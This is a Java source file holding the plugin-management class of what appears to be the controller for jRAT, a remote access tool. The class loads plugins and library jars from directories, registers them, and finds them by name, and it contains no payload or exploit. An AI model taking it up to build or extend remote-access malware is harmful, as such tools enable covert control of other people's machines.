package se.jrat.controller.addons;

import java.io.File;
import java.util.List;

import jrat.api.RATPlugin;
import jrat.api.events.Event;
import pluginlib.EventHandler;
import pluginlib.Plugin;
import pluginlib.PluginLoader;
import se.jrat.controller.Globals;
import se.jrat.controller.Main;
import se.jrat.controller.utils.ClassUtils;

public class Plugins {

	private static EventHandler<Event> handler = new EventHandler<Event>();
	private static PluginLoader<RATPlugin> loader;
	
	public static EventHandler<Event> getHandler() {
		return handler;
	}
	
	public static void init() throws Exception {
		loader = new PluginLoader<RATPlugin>(Globals.getPluginDirectory());
		loader.loadPlugins();
	}
	
	public static PluginLoader<RATPlugin> getLoader() {
		return loader;
	}
	
	public static List<RATPlugin> getPlugins() {
		return loader.getPlugins();
	}

	public static void loadLibs() throws Exception {
		File dir = Globals.getLibDirectory();

		for (File file : dir.listFiles()) {
			Main.debug("Loading library: " + file.getName());
			ClassUtils.addToClassPath(file);
		}
	}

	public static void register(Plugin<RATPlugin> plugin) {
		loader.getRawPlugins().remove(plugin);
		loader.getRawPlugins().add(plugin);
	}

	public static RATPlugin getPlugin(String name) {
		for (RATPlugin plugin : loader.getPlugins()) {
			if (plugin.getName().equalsIgnoreCase(name)) {
				return plugin;
			}
		}

		return null;
	}

}
